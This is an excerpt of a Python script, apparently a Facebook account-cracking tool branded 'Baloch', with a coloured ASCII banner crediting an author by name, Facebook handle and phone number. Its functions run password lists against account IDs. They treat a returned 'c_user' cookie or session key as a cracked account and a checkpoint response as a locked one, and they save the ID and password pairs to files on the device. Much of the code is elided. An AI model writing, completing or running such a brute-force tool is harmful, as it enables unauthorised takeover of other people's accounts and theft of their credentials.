...
#menu_apikey()
logo=(f"""\033[1;32m
\033[1;32md8888b.  .d8b.  db       .d88b.   .o88b. db   db 
\033[1;33m88  `8D d8' `8b 88      .8P  Y8. d8P  Y8 88   88 
\033[1;33m88oooY' 88ooo88 88      88    88 8P      88ooo88 
\033[1;32m88~~~b. 88~~~88 88      88    88 8b      88~~~88 
\033[1;32m88   8D 88   88 88booo. `8b  d8' Y8b  d8 88   88 
\033[1;33mY8888P' YP   YP Y88888P  `Y88P'   `Y88P' YP   YP 
                                                
    

 [$]°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°[$]
    Author   :\033[1;36m ALI BALOCH 
    Facebook : \033[1;34m ALIBALOCH356
    Connect  : \033[1;32m03143572356
    Version : 2.0
    WHATSAPP GROUP : Baloch command 
...
def Baloch():
    ...
    print(f" \033[1;37m[2] join group")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [Baloch] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ali:
                                ...
                                print(f'\r\r\033[1;32m [Baloch-OK] %s|%s'%(ids,pas))
                                open(f'/sdcard/Baloch-OK.txt', 'a').write(ids+' | '+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Ali:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[1;31m [Baloch-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Baloch-CP.txt', 'a').write(ids+' | '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ali:
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Baloch-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Baloch-CP.txt', 'a').write(ids+' | '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [Baloch-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Baloch-OK.txt','a').write(ids+' | '+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
    ...
    #        print(idf+'|'+ps)
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\n')
                print('\033[1;92m[Baloch-OK] '+idf+' | '+ps+'\033[0;97m')
                cek_apk(coki)
                ...
                cid = coki[141:156]
                print('\n')
                print('\033[1;91m[Baloch-CP] '+idf+' | '+ps+'\033[0;97m')
